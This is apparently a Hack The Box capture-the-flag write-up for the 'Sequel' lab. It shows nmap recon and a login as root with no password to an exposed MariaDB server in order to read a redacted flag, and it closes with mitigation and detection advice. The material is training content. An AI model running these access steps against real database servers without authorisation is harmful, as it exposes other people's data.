---
machine: Sequel
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, mysql, no-auth, database]
---

# Sequel — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available (Starting Point), publishable.
> Reference notes. No real flags or credentials.

## TL;DR

**MariaDB/MySQL on 3306 with `root` and no password**. Connect with the client, list the databases, open the challenge one and read the table holding the flag. Another misconfigured service, no exploit.

## Recon

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
22/tcp    ssh    OpenSSH
3306/tcp  mysql  MariaDB 10.3.27
```

```bash
nmap -p3306 --script mysql-info,mysql-empty-password <IP>
```

## Access

```bash
mysql -h <IP> -u root
```

```sql
show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```sql
use htb;
show tables;
select * from config;
```

```text
+----+----------------------------------+
| id | value                            |
+----+----------------------------------+
|  1 | <flag>                           |
+----+----------------------------------+
```

If `root` had a password, the next step would be default or empty credentials on other users and, with `FILE`, reading system files.

## Evidence (redacted)

```text
htb.config.value  ->  <flag>
```

## Lessons

- A database engine exposed with `root` and no password means full read access to the data server.
- `bind-address = 0.0.0.0` on 3306 puts the database on the network without any vulnerability.
- Mitigation: `bind-address = 127.0.0.1`, `root@localhost` with a strong password, per-application users, and a firewall.
- Detection: 3306 connections from outside the application segment and successful `root` logins from new IPs.
